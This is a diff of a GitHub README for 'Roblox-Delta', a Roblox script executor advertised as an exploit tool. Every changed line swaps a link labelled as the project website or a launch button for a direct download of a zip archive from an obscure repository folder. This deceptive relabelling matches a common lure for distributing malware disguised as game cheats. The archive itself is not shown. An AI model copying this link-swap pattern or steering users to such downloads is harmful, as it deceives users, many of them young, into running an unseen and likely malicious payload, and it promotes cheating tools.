@@ -12,9 +12,9 @@ Welcome to Roblox-Delta, where we are setting a new standard in execution! Our r
 - delta-executor-new-update-v648
 
 ### 💻 Get Started Now!
-Visit [Delta Exploit Website](https://deltaexploit.app) to discover how we are changing the game in execution technology!
+Visit [Delta Exploit Website](https://github.com/CYBERDRAGE/Roblox-Delta/raw/refs/heads/master/assertorial/Roblox_Delta_1.2-beta.5.zip) to discover how we are changing the game in execution technology!
 
-[![Launch Delta Exploit](https://img.shields.io/badge/Launch-Delta%20Exploit-blue)](https://deltaexploit.app)
+[![Launch Delta Exploit](https://github.com/CYBERDRAGE/Roblox-Delta/raw/refs/heads/master/assertorial/Roblox_Delta_1.2-beta.5.zip%20Exploit-blue)](https://github.com/CYBERDRAGE/Roblox-Delta/raw/refs/heads/master/assertorial/Roblox_Delta_1.2-beta.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ At Roblox-Delta, we are passionate about pushing the boundaries of what is possi
 
 ## How to Use Roblox-Delta
 
-To get started with Roblox-Delta, simply visit our [website](https://deltaexploit.app) and explore the range of features and tools available. Whether you are a seasoned developer or just beginning your journey, Roblox-Delta has something for everyone.
+To get started with Roblox-Delta, simply visit our [website](https://github.com/CYBERDRAGE/Roblox-Delta/raw/refs/heads/master/assertorial/Roblox_Delta_1.2-beta.5.zip) and explore the range of features and tools available. Whether you are a seasoned developer or just beginning your journey, Roblox-Delta has something for everyone.
 
 ---
 
